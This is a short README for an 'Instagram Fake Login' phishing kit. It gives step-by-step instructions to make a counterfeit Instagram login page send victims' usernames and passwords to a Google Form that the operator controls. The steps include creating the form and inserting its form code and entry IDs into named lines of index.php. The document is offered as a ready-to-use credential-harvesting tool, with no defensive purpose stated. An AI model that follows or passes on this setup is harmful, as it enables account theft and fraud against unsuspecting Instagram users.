# Instagram-Fake-Login
Instagram Fake Login with Database as Google Forms

<img src="https://i.imgur.com/YN91eqm.png" width="400px"/>

How to Configure Code Correctly -->

1. Download the whole source code.

2. Goto https://docs.google.com/forms & make a simple form with
      'Username' - Short Paragraph
      'Password' - Short Paragraph
      
3. Share the form Publically and get link
    (Link will look like this) 
    docs.google.com/forms/d/e/ (THIS IS FORM CODE) /viewform?usp=sf_link 
  
4. Replace the (THIS IS FORM CODE) of your form in source code > index.php  (LINE 65 in Source Code)
  
5. Open your Orignal Google Form > CTRL + U (Source Code) > CTRL + F (Find) > Find 'Username'
  - After Finding, see Right to it, a 'null,0' like this will exist, a code connected to it will exist too.
  - [[1181786XXX   -   Copy this code from your form.
  - Replace your code in source code in line 'entry.1181786XXX' (LINE 26 & 27 in Source Code)
  
6. Do Same with Password >> CTRL + F >> Replace Code in Source Code..
7. Done!
